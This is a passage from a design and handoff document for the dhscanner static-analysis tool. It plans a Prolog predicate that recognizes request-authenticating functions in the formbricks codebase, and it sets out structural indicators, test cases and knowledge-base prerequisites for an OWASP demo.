  (`notAuthenticated → 401`, `unauthorized → 403`, `forbidden → 403`,
  `notFound → 404`, `badRequest → 400`, `methodNotAllowed → 405`,
  `gone → 410`, `tooManyRequests → 429`, `internalServerError → 500`,
  `success → 200`).

**Payoff:** one-hop status-code affiliation for every
`return responses.X()` in the codebase, no wrapper-body descent
required. Applies to any project using the same naming convention
(common in Node/Next.js/Express codebases). Complementary to — not
replacement for — the deeper `NextResponse.json({...}, {status})` +
`throw <AuthError>` catalog rows.

### HOF-transparent reachability — the load-bearing scale question

Roughly **~30-40% of formbricks** is HOF-wrapped (all of v2 via
`authenticatedApiClient`; several v1 POSTs via `withApiLogging`). The
seed vuln (H1, H2) + all four fix-commit siblings live in HOF-free
code — **"lucky" for the M-of-N recall metric** (no HOF traversal
needed to hit M = 4), **"unlucky" for the exhaustive-search /
cross-idiom generalization claim** (v2 endpoints are invisible
without callback-argument reachability).

Two mitigations available; pick one before the exhaustive-search
claim can go on a slide honestly:

- **Mitigation 1 — callback-argument reachability.** The right
  answer. Generalizes to any HOF. Requires dhscanner's KB to model
  callback invocation through a HOF (`authenticatedApiClient({
  handler: cb })` → `handler(...)` inside the HOF body → `cb`'s body
  runs) as a resolved call-graph edge. **Needs empirical
  verification against the running kbapi** before the demo commits
  to it.
- **Mitigation 2 — per-HOF FQN cataloging.** Pragmatic shortcut.
  Add `utils_authN_hof_fqn('.../authenticatedApiClient')` (one row);
  every handler wrapped in it is authN-gated by construction. Brittle
  at scale; works for the demo.

**Framing for the OWASP deck:** *"Seed and recall metric are unblocked
by HOF work — they live in the HOF-free half. The exhaustive-search
and cross-idiom generalization claims require the HOF work. Both
halves are the same codebase, handled by the same call-graph
architecture."*

### Two-tier predicate contract (design principle for all new predicates)

Every recognizer we add ships in **two forms**:

- **Definitive** — `is_<X>/1`, structural yes/no, used internally by
  higher-order predicates that assume X-hood.
- **Candidate** — `<X>_candidates/N`, partial-match-tolerant,
  returns rich metadata (FQN, name, file:line, params, return type,
  matched indicators list, one-hop callers, one-hop callees). The
  `_candidates` suffix is the API contract signal: *human/LLM review
  expected.*

Consumer split:

- **KB** enumerates by structure — deterministic, exhaustive,
  name-blind. Cheap.
- **LLM** disambiguates by names + context — semantically flexible.
  Handles synonyms, false positives (`authIcon`, `authRedirect`,
  etc.), non-English identifiers.

**Never mix these.** Do not hard-code name matching (regex on
`/auth|verify|check/i`) into the KB. Function names are camel-cased
mini-sentences with verb-object grammar — well-suited to sentence
embeddings or LLMs, poorly to word2vec (compound identifiers are
OOV). Design decision: **KB is name-blind; names go in metadata; LLM
does the semantic disambiguation.**

### Positioning — formbricks is the *hard* case for JS auth

Framework-declarative auth (Spring `@PreAuthorize`, NestJS
`@UseGuards`, Django `@login_required`, FastAPI
`Depends(get_current_user)`) is the **easiest** case for static
analysis — one-row FQN catalog per framework, tier-1 hits cover
whole ecosystems in a handful of rows. Formbricks lives at the
**harder** end of the spectrum (inline + wrapper + HOF +
inline-expanded verifier + hand-rolled), which is representative of
modern Node.js. **The demo picks the hard case; declarative
frameworks are one-line extensions.** Worth naming preemptively for
Q&A.

---

## Next-session tasks (handoff 2026-08-10) — first predicate implementation

*Persisted 2026-08-10 for the next session's opening. The prior
session (2026-08-07 → 2026-08-10) closed out the auth-primitive
characterization; Task C ("find authenticated primitives") from
the 2026-08-05 handoff is now design-complete (see §"Session summary
— 2026-08-07 → 2026-08-10" above). This handoff scopes the
**first implementation** task — one predicate, one shape, one
reference target. Enumeration tasks A and B from 2026-08-05 remain
valid; they can proceed in parallel or be deferred until after Task D.*

### Task D — implement `authenticating_function_candidates/1` (Shape A)

Implement the first candidate-shaped predicate in the dhscanner KB,
using formbricks's `authenticateRequest` as the reference target.
One predicate, one shape (A), one reference codebase — scoped tight
so it can ship in one session.

**Concrete target:**

- **Function to recognize:** `authenticateRequest` in
  `../formbricks/apps/web/app/api/v1/auth.ts` (formbricks at
  `v3.16.0` / commit `ec78038c`).
- **Predicate name:** `authenticating_function_candidates/1` —
  candidate-shaped, name-agnostic. Rationale in §"Two-tier predicate
  contract" above.
- **Return shape:** structured facts including function FQN, name,
  file:line range, parameters (name + type FQN), return type,
  indicators matched, one-hop callers, one-hop callees. Enough for
  the LLM to disambiguate without re-reading source.
- **Consumer:** the LLM query loop reads returned candidates +
  metadata and disambiguates by name / context.
- **File to edit:** `dhscanner.core/dhscanner.service.queryengine/utils.pl`.

### The six structural indicators (Shape A — identity carrier)

1. Has a parameter typed `Request` / `NextRequest` /
   `express.Request` / `fastify.FastifyRequest` (type FQN match,
   parameter name irrelevant).
2. Reads a value out of `.headers.get('...')` / `.query.X` /
   `.body.X` / `.cookies.X` on that parameter.
3. Early-returns `null` if that value is falsy (Shape A polarity on
   the raw source).
4. Passes the value into a nested token-verifier V (V has its own
   indicators — recognized via its Prisma-find-lookup shape; see the
   `utils_token_verifier` sketch in the 2026-08-07 agent transcript
   for the concrete predicate body).
5. Early-returns `null` if V's result is falsy (Shape A polarity on
   V's return).
6. Return type is `T | null`; V's return **dataflows to F's return**
   on the happy path (the identity is *carried out*).

Meta: 1-2 are type/AST signals; 3+5 are CFG-polarity signals; 4 is a
composition edge; **6 is the load-bearing dataflow signal** that
distinguishes Shape A (identity carrier) from Shape B (middleware
guard, which has *no* input-to-return dataflow).

### Strictness levels — return both

- **High-confidence candidates:** all six indicators hold.
- **Partial candidates:** four or five of six hold.

Both are returned; the LLM decides which to trust. Rationale:
`authenticateRequest` in formbricks fires all six; codebases with
variant idioms might miss one or two but still be authenticators.

### Test criteria — all must pass

Positive:

- [ ] `authenticateRequest` in
      `../formbricks/apps/web/app/api/v1/auth.ts` fires as
      **high-confidence** (6/6).
- [ ] `authenticateRequest` in
      `../formbricks/apps/web/modules/api/v2/auth/authenticate-request.ts`
      (v2 variant) also fires as **high-confidence** — same shape,
      different location. Confirms name-blindness.

Negative:

- [ ] `getApiKeyWithPermissions` in
      `../formbricks/apps/web/modules/organization/settings/api-keys/lib/api-key.ts`
      does **not** fire — it's a token verifier (V), not a request
      authenticator. Confirms role separation between the wrapper (F)
      and the inner leaf (V).
- [ ] `checkAuth` in
      `../formbricks/apps/web/app/api/v1/management/storage/lib/utils.ts`
      does **not** fire — Shape B (middleware guard), not Shape A
      (identity carrier). Confirms polarity gating via indicator 6.
- [ ] `hashApiKey` (in
      `../formbricks/apps/web/modules/api/v2/management/lib/utils.ts`,
      or elsewhere — grep to confirm) does **not** fire — pure
      crypto hash, no request param, no null return path. Confirms
      Shape A specificity.
- [ ] Sample ~5 non-auth functions from
      `../formbricks/apps/web/lib/response/service.ts` — none fire.
      False-positive control.

### Prerequisites — KB capability checks (do BEFORE writing the predicate)

Verify each exists in `dhscanner.core/dhscanner.service.queryengine/utils.pl`
(or its friends); add any that are missing before the predicate itself:

- [ ] `kb_param_type_fqn(F, ParamIdx, TypeFqn)` — parameter type at
      index. AST-derivable.
- [ ] `kb_call_within_function(Call, F)` — enumerate calls inside a
      function body.
- [ ] `kb_return_stmt_in(F, RetStmt)` + `kb_return_value_of(RetStmt, RetExpr)`
      — enumerate returns and their expressions.
- [ ] **`kb_dataflow_edge` models object-field taint**
      (`x → { field: x }`). **Critical.** Load-bearing dependency
      both for indicator 5 (V's return object has fields flowing to
      F's return) and for the analogous Prisma `where: { hashedKey }`
      case inside `utils_token_verifier` downstream. If this doesn't
      exist, fix it first — no fallback.
- [ ] `utils_dataflow_path(A, B, _)` — already exists
      (see §"What dhscanner already has" above, referencing
      `utils.pl:248`). Confirm current head.
- [ ] `kb_call_resolved(Call, Fqn)` — already exists. Confirm.
- [ ] `kb_may_return_null(F)` or equivalent — either from TypeScript
      type-inference facts (`Promise<T | null>` annotation) or from
      AST scan for `return null;` presence.

### The one-line KB smoke test (run before predicate work)

For a trivially small function `f(x) { return { key: x }; }`, does
`utils_dataflow_path(x_param, function_return, _)` succeed against
the running kbapi? If **yes**, proceed with predicate. If **no**,
that's the object-field-taint edge from Prerequisites — fix it first,
every downstream predicate depending on Prisma / any-JS-ORM
options-object breaks without it.

### Explicitly out of scope for Task D

- **Shape B recognizer** (`middleware_gate_candidates/1` for
  `checkAuth`) — separate Task E, next task.
- **Non-Prisma token verifiers** — Task D composes with a
  Prisma-only `utils_token_verifier`. Other ORMs added later.
- **HOF-transparent reachability** (`authenticatedApiClient` v2
  variant) — Task F. Not needed for Task D's test criteria.
- **Name-based ranking / regex-matching inside the KB** — never.
  Names in metadata; LLM disambiguates. See §"Two-tier predicate
  contract" above.
- **`responses`-catalog kbgen extraction** — orthogonal task,
  belongs on the Shape B branch (recognizing `checkAuth`'s return
  shape needs the response catalog; Shape A doesn't). Defer to
  Task E.

### Files the new session should read (in this order)

1. `AGENTS.md` at the repo root — top-level workspace rules.
2. This file — start at §"Session summary — 2026-08-07 → 2026-08-10"
   above for the design context, then §"Static analysis architecture
   (what dhscanner needs)" for the tier-1/2 framework, then
   §"'Turtles all the way down' — the firewall" for the design
   principle.
3. `dhscanner.core/dhscanner.service.queryengine/utils.pl` — where
   the predicate lives. Existing style/conventions to match.
4. `../formbricks/apps/web/app/api/v1/auth.ts` — the reference
   target. Read the full file (should be ~50 lines).

### Design principles to preserve (relearn from transcript if unclear)

- **Tier-2b architecture** — KB enumerates by structure; LLM
  disambiguates by names + context. Never the reverse.
- **`_candidates` suffix** — signals "human/LLM review expected."
- **KB is name-blind** — names go in metadata, never in filter
  predicates.
- **Turtles all the way down** — wrappers aren't tagged; leaves are
  cataloged; call-graph closure carries the "auth" property upward.
- **Two shapes, both first-class** — do not conflate identity-carriers
  (Shape A) with middleware-guards (Shape B). Different indicator
  sets, inverted polarity, different return-value semantics.

### Where this session's state lives

Anything not in this file that the next session might need:

- **Session transcript (2026-08-07 → 2026-08-10)** — the full
  turn-by-turn reasoning behind the two-shape distinction, the
  seven-idiom taxonomy, the `responses`-catalog observation, the
  HOF empirical prevalence data, and the two-tier predicate
  contract lives in the agent-transcripts folder. Reconstruction
  should not be needed — everything load-bearing is in §"Session
  summary — 2026-08-07 → 2026-08-10" above — but the transcript is
  there if a specific claim needs to be re-derived from first
  principles.

---

## Cross-references

- `docs/GOAL.md` — the OWASP 2026 north star this file serves.
- `demo/phpbb.md` — companion demo, generalization to PHP + yaml routing
  + throw-and-exit auth idiom.
- `demo/concretecms.md` — companion demo *(to be written)*,
  generalization to fluent-DSL routing + declared OAuth scopes +
  middleware-attached auth.
- `docs/ARCHITECTURE.md` — where the kbapi sits in the runtime pipeline
  (agent mode, `queryengine:3000`, `kb_location` handoff).

[1]: https://github.com/formbricks/formbricks/releases/tag/4.0.0
[2]: https://github.com/formbricks/formbricks/commit/9d84bc0c8de315bacbde6f1fa4ac75628e5ac5d6
